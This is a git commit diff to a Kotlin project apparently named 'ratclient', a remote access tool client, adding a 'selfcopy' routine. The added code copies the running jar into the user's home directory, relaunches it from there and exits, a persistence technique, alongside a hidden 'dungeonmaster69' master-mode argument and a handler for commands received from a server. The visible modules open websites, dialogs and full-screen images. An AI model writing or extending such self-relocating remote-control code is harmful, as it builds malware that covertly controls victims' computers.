035fe1117aff1040dccebf52eb6e25e040265015
x123dev <mr.x123123123@gmail.com>
2023-06-13 15:39:55 +0200

    trying to add selfcopy

--- src/main/kotlin/net/x123dev/ratclient/Main.kt
+++ src/main/kotlin/net/x123dev/ratclient/Main.kt
@@ -1,10 +1,20 @@
 package net.x123dev.ratclient
 
-import net.x123dev.ratclient.modules.*
+import net.x123dev.ratclient.modules.browseWebsite
+import net.x123dev.ratclient.modules.displayInfoDialog
+import net.x123dev.ratclient.modules.fullScreenImage
+import net.x123dev.ratclient.modules.fullScreenImageFromURL
+import java.io.File
 
 var ismaster:Boolean = false
 
 fun main(args: Array<String>){
+    if(!System.getProperty("user.dir").equals(System.getProperty("user.home"))){
+        selfcopy()
+        Thread.sleep(3000)
+        Runtime.getRuntime().exec("java -jar "+System.getProperty("user.home")+File.separator+"ratclient.jar")
+        System.exit(0)
+    }
     if(args.size==1&&args[0].equals("dungeonmaster69"))
         ismaster=true;
     if(ismaster)
@@ -61,4 +71,9 @@ fun handleIncoming(rec:String){
         }
         else -> println("received unknown command from server")
     }
+}
+
+fun selfcopy(){
+    var thisFile = File(System.getProperty("user.dir")+File.separator+"ratclient.jar")
+    thisFile.copyTo(File(System.getProperty("user.home")+File.separator+"ratclient.jar"),true)
 }
